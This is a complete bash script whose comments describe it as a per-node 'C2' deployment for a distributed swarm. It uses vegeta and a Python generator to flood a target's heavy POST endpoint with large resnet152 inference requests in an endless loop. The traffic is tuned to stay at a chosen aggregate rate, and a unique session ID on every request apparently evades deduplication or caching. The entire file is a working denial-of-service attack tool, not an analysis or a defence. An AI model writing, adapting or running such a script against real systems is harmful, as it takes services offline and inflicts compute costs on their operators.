#!/bin/bash
# swarm_deploy.sh -- per-node C2 deployment
# Bridges swarm_config.json to vegeta with per-request UUID injection.
# vegeta cannot template dynamic values from static JSON; this script
# reads the config and runs a Python+vegeta pipeline identical to the
# local PoC but targeting the heavy POST endpoint.
#
# Usage: swarm_deploy.sh <swarm_size>
#   swarm_size: total number of C2 nodes in the swarm.
#   Per-node RPS = max_rps / swarm_size (aggregate stays at max_rps).
SWARM_SIZE=${1:?"Usage: swarm_deploy.sh <swarm_size>"}

# Clean up all child processes on exit (prevent zombie vegeta/python on headless C2)
trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT

URL=$(jq -r .target_url swarm_config.json)
TOTAL_RPS=$(jq -r .max_rps swarm_config.json)
# awk for float division: bash truncates 850/15=56, missing threshold by 10 RPS.
NODE_RPS=$(LC_ALL=C awk "BEGIN {printf \"%.2f\", $TOTAL_RPS / $SWARM_SIZE}")
UA=$(jq -r '.headers["User-Agent"]' swarm_config.json)

# Python target generator: vegeta HTTP format with unique session_id per request.
# ANSI-C quoting ($'...\n...'): \n = real newline (Python statement separator).
# \\n inside f-string: literal \n for vegeta target line breaks.
PY=$'import uuid,json,sys,signal\nsignal.signal(signal.SIGPIPE,signal.SIG_DFL)\nurl,ua=sys.argv[1],sys.argv[2]\nwhile True:\n    body=json.dumps({"batch_size":1000,"model":"resnet152","session_id":uuid.uuid4().hex})\n    print(f"POST {url}\\nUser-Agent: {ua}\\nContent-Type: application/json\\n\\n{body}\\n",flush=True)'

ulimit -n 65535

while true; do
  python3 -c "$PY" "$URL" "$UA" | \
  vegeta attack -format=http -rate="$NODE_RPS" -duration=5s -timeout=60s | \
  vegeta report -type=json | \
  jq -c '{rate,codes:.status_codes}'
done
